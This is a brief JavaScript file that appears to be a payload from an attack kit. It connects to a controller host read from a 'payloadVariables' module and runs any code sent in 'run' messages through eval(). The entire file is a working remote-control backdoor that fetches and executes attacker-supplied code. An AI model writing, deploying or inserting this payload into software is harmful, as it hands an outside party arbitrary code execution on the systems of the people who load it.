import io from 'socket.io-client'
const { CSIK_HOST } = require('../../payloadVariables')

var socket = io(CSIK_HOST)
socket.on('connect', () => {
    console.log('Connected')
})

socket.on('run', (msg) => {
    eval(msg)
})